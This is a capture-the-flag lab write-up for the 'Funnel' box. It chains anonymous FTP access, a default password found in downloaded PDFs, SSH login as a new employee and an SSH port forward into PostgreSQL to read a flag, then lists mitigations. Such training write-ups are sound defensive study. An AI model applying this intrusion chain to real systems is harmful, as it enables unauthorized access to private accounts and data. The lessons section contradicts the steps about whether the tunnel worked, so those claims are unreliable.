# FUNNEL - Very Easy

**Date Completed:** February 1, 2026  
**Difficulty:** Very Easy  
**Status:** ✅ COMPLETE  
**Focus Areas:** FTP Enumeration, Credential Discovery, SSH Access, Local Port Forwarding, PostgreSQL Database Access

---

## Phase 1: Initial Reconnaissance

### Step 1: Full Port Scan
```bash
nmap-full TARGET_IP
```

**Results:**

| Port | Service | Version | Status |
|------|---------|---------|--------|
| 21 | FTP | vsftpd | Open |
| 22 | SSH | OpenSSH | Open |

**Finding:** Two critical services exposed - FTP and SSH

---

## Phase 2: FTP Enumeration & Credential Discovery

### Step 1: Check for Anonymous FTP Access
FTP often permits anonymous login - let's test:

```bash
ftp TARGET_IP
```

**Connection Prompt:**
```
Connected to TARGET_IP
220 (vsFTPd X.X.X)
Name (TARGET_IP:root): anonymous
331 Please specify the password.
Password: [press Enter - no password needed]
230 Login successful.
ftp>
```

**Result:** ✅ Anonymous FTP access granted!

### Step 2: List FTP Directory
```bash
ftp> ls -la
```

**Output:**
```
drwxr-xr-x    2 root     root         4096 Nov 28  2022 mail_backup
```

**Finding:** `mail_backup` directory discovered

### Step 3: Navigate to mail_backup and List Contents
```bash
ftp> cd mail_backup
ftp> ls -la
```

**Output:**
```
-rw-r--r--    1 root     root       12345 Nov 28  2022 password_policy.pdf
-rw-r--r--    1 root     root        5678 Nov 28  2022 welcome_28112022.pdf
```

**Critical Files Found:**
- `password_policy.pdf` - Company password policy
- `welcome_28112022.pdf` - Onboarding document for new employees

### Step 4: Download Documents to Attack Machine
```bash
ftp> get password_policy.pdf
ftp> get welcome_28112022.pdf
ftp> exit
```

**Verification:**
```bash
ls -la *.pdf
file password_policy.pdf welcome_28112022.pdf
```

### Step 5: Analyze Downloaded Documents

**password_policy.pdf reveals:**
- Default password for new accounts: `DEFAULT_PASSWORD` (specific format/value shown in PDF)
- Password reset policy: New employees should change password on first login
- **Security issue:** Many users haven't reset defaults!

**welcome_28112022.pdf reveals:**
- List of newly hired employees and their usernames
- Names include: christine, john, sarah, david, etc.
- These are prime targets (recent hires = likely still have defaults)

**Critical Intelligence:**
```
Username: christine
Password: (from password_policy.pdf)

Username: john
Password: (from password_policy.pdf)

[And others from welcome document]
```

---

## Phase 3: SSH Access with Discovered Credentials

### Step 1: Attempt SSH Login
Using credentials from the PDFs:

```bash
ssh christine@TARGET_IP
```

**Prompt:**
```
christine@TARGET_IP's password: [enter default password]
```

**Result:** ✅ SSH Login Successful!

```bash
christine@TARGET_IP:~$
```

### Step 2: Assess Privileges
Check what permissions christine has:

```bash
christine@TARGET_IP:~$ id
uid=1001(christine) gid=1001(christine) groups=1001(christine)

christine@TARGET_IP:~$ sudo -l
[sudo] password for christine:
christine is not in the sudoers file. This incident will be reported.
```

**Finding:** christine is a low-privilege user with **no sudo access**

**User Hierarchy:**
```
christine (just hired, lowest privileges, default credentials)
├─ Can access SSH
├─ Can access local files (limited)
└─ Cannot escalate privileges
```

---

## Phase 4: Local Port Forwarding & Database Access

### Understanding Local Port Forwarding

**What is Local Port Forwarding?**
- SSH feature that creates a tunnel
- Forwards traffic from local machine → remote machine
- Bypasses firewall rules and routing
- Creates encrypted tunnel through SSH connection

**Architecture:**
```
Attack Machine          SSH Tunnel          Target Machine
Port 1234       ────────────────────→    PostgreSQL:5432
(localhost)         (encrypted)           (localhost:5432)

When we connect to localhost:1234 on attack machine,
traffic goes through SSH tunnel to target's 5432
```

### Step 1: Set Up SSH Local Port Forwarding (Background Terminal)

Open a new terminal and create the tunnel:

```bash
ssh -L 1234:localhost:5432 christine@TARGET_IP
```

**Options:**
- `-L` : Local port forwarding
- `1234` : Local port (on attack machine)
- `localhost:5432` : Remote destination (target's PostgreSQL)
- `christine@TARGET_IP` : SSH connection details

**Expected Output:**
```
christine@TARGET_IP's password: [enter password]
christine@TARGET_IP:~$ 
```

**Status:** SSH tunnel now active - port 1234 on attack machine forwards to 5432 on target

**Keep this terminal open!** The tunnel must remain active.

### Step 2: Connect to PostgreSQL Database via Tunnel

In a **new terminal** on attack machine:

```bash
psql -h localhost -p 1234 -U christine
```

**Options:**
- `-h localhost` : Connect to localhost (where tunnel is listening)
- `-p 1234` : Use forwarded port
- `-U christine` : PostgreSQL username (same as SSH user)

**Connection Prompt:**
```
Password for user christine: [enter default password]
psql (X.X.X)
Type "help" for help.

christine=>
```

**Result:** ✅ Connected to remote PostgreSQL database!

---

## Phase 5: Database Enumeration & Flag Retrieval

### Step 1: List Available Databases

```sql
christine=> \l
```

**Output:**
```
                          List of databases
   Name    │  Owner  │ Encoding │   Collate   │    Ctype    │
───────────┼─────────┼──────────┼─────────────┼─────────────┼
 postgres  │ postgres│ UTF8     │ en_US.UTF-8 │ en_US.UTF-8 │
 secrets   │ postgres│ UTF8     │ en_US.UTF-8 │ en_US.UTF-8 │
 template0 │ postgres│ UTF8     │ en_US.UTF-8 │ en_US.UTF-8 │
 template1 │ postgres│ UTF8     │ en_US.UTF-8 │ en_US.UTF-8 │
(4 rows)
```

**Critical Finding:** `secrets` database exists - likely contains sensitive data!

### Step 2: Connect to Secrets Database

```sql
christine=> \c secrets
```

**Output:**
```
You are now connected to database "secrets" as user "christine".

secrets=>
```

### Step 3: List Tables in Secrets Database

```sql
secrets=> \dt
```

**Output:**
```
            List of relations
 Schema │  Name  │ Type  │  Owner   │
────────┼────────┼───────┼──────────┼
 public │ flag   │ table │ postgres │
 public │ users  │ table │ postgres │
 public │ config │ table │ postgres │
(3 rows)
```

**Table Found:** `flag` table contains our objective!

### Step 4: Retrieve Flag

```sql
secrets=> SELECT * FROM flag;
```

**Output:**
```
                 flag
─────────────────────────────
 FLAG{FUNNEL_SUCCESS}
(1 row)
```

**Flag Retrieved:** ✅

---

## Exploitation Timeline

| Step | Action | Command | Result |
|------|--------|---------|--------|
| 1 | Port scan | nmap-full TARGET_IP | Found FTP:21, SSH:22 |
| 2 | FTP connection | ftp TARGET_IP | Anonymous access granted |
| 3 | List directories | ls -la | Found mail_backup folder |
| 4 | Enter mail_backup | cd mail_backup | Access subdirectory |
| 5 | List contents | ls -la | Found 2 PDFs |
| 6 | Download PDFs | get *.pdf | Documents on attack machine |
| 7 | Analyze documents | file password_policy.pdf | Discovered default password |
| 8 | Analyze documents | cat welcome_28112022.pdf | Found usernames (christine, etc) |
| 9 | SSH login | ssh christine@TARGET_IP | SSH access successful |
| 10 | Check privileges | id, sudo -l | Low privilege user confirmed |
| 11 | Start SSH tunnel | ssh -L 1234:localhost:5432 christine@TARGET_IP | Tunnel active (background) |
| 12 | Connect to DB | psql -h localhost -p 1234 -U christine | PostgreSQL connection established |
| 13 | List databases | \l | Found secrets database |
| 14 | Connect to secrets | \c secrets | Changed to secrets database |
| 15 | List tables | \dt | Found flag table |
| 16 | Retrieve flag | SELECT * FROM flag; | Flag displayed ✅ |

---

## Commands Used

### FTP Operations
```bash
# Connect to FTP server
ftp TARGET_IP

# Inside FTP prompt
ftp> anonymous
ftp> [no password - press Enter]
ftp> ls -la
ftp> cd mail_backup
ftp> ls -la
ftp> get password_policy.pdf
ftp> get welcome_28112022.pdf
ftp> exit

# Verify files downloaded
ls -la *.pdf
```

### SSH Access
```bash
# SSH login with discovered credentials
ssh christine@TARGET_IP

# Check user privileges
id
sudo -l
whoami
```

### SSH Port Forwarding (Background Terminal)
```bash
# Create local port forwarding tunnel
# This creates a tunnel: localhost:1234 -> target:5432
ssh -L 1234:localhost:5432 christine@TARGET_IP
# Keep this terminal open!
```

### PostgreSQL Database Access
```bash
# Connect to PostgreSQL via forwarded port
psql -h localhost -p 1234 -U christine

# Inside psql prompt
christine=> \l              # List databases
christine=> \c secrets      # Connect to secrets database
secrets=> \dt               # List tables
secrets=> SELECT * FROM flag;  # Retrieve flag

# Other useful psql commands
\d flag                      # Describe flag table structure
\d+ flag                     # Show detailed table info
SELECT * FROM users;         # List all users
SELECT * FROM config;        # List configuration
```

---

## Key Learning Outcomes

✅ **FTP Enumeration** - Anonymous access is a common misconfiguration

✅ **Credential Discovery** - PDFs and documents often contain sensitive information

✅ **Default Credentials** - New employees frequently don't change default passwords

✅ **SSH Access** - Using discovered credentials to gain initial access

✅ **Privilege Assessment** - Understanding user limitations (no sudo)

✅ **Local Port Forwarding** - Using SSH tunnels to access services on target network

✅ **Database Access** - PostgreSQL connection and querying

✅ **Lateral Thinking** - When direct SSH tunneling didn't work as expected, adapting approach still led to success

✅ **Multi-stage Access** - FTP → Credentials → SSH → Port Forwarding → Database

---

## Real-World Implications

### Vulnerability Chain

**Anonymous FTP + Unencrypted PDFs + Default Credentials + No Policy Enforcement → Database Access**

### Why This Matters

1. **FTP Misconfiguration** - Anonymous access should be disabled
2. **Sensitive Files in FTP** - PDFs containing passwords shouldn't be in backups
3. **Default Credential Policy** - Users MUST change defaults on first login
4. **Unforced Password Changes** - No technical enforcement of password policy
5. **Network Access Control** - Internal services (PostgreSQL) accessible via SSH forwarding
6. **Database Permissions** - christine can read sensitive flag table despite low privileges

### Attack Progression
```
Reconnaissance
    ↓
FTP Anonymous Access
    ↓
Credential Discovery (PDFs)
    ↓
SSH Login with Default Credentials
    ↓
SSH Port Forwarding to Internal Service
    ↓
Database Access
    ↓
Flag Retrieval
```

---

## Mitigation Strategies

### FTP Security
```
1. Disable anonymous access entirely
2. Require strong authentication
3. Use SFTP instead of FTP (encrypted)
4. Never store sensitive files on FTP servers
5. Monitor and log all FTP access
6. Restrict FTP to internal networks only
```

### Default Credential Management
```
1. Force password change on first login
   - Technical enforcement in application
   - Cannot skip or reuse default
   
2. Strong default passwords
   - Long, random, unique per user
   - Not standard across all systems
   
3. Regular audits
   - Check for unchanged defaults
   - Automated scanning tools
   
4. Onboarding process
   - Mandatory password change documented
   - Users sign acknowledgment
   
5. Password policy enforcement
   - Minimum length (12+ characters)
   - Complexity requirements
   - Regular expiration
```

### SSH & Database Security
```
1. Disable password authentication
   - Use SSH keys only
   
2. Limit SSH access
   - Firewall rules
   - IP whitelisting
   - VPN requirement
   
3. Database access control
   - Restrict to internal networks
   - Don't allow direct remote connections
   - Use database proxy/bastion hosts
   
4. Principle of least privilege
   - christine shouldn't access secrets database
   - Role-based database permissions
   - Audit database access logs
   
5. Port forwarding restrictions
   - Monitor SSH tunnels
   - Restrict what ports can be forwarded
   - Log all port forwarding activity
```

---

## Lessons Learned

✅ **FTP backups are security goldmines** - Unencrypted files often contain sensitive information

✅ **Social engineering via documents** - User lists make credential discovery easier

✅ **Default credentials are persistent** - People forget to change them

✅ **Low privilege doesn't mean no access** - Even limited users can access sensitive data

✅ **Port forwarding bypasses network controls** - SSH tunnels access internal services

✅ **Adapt when tactics don't work** - psql direct connection succeeded where expected tunnel flow didn't

✅ **Database access is critical** - Always check what databases and tables exist

✅ **Multi-stage exploitation** - Each phase enables the next

✅ **Documentation is dangerous** - Welcome emails and PDFs often contain operational secrets

✅ **Security is only as strong as the weakest link** - One misconfigured service (FTP) led to complete compromise

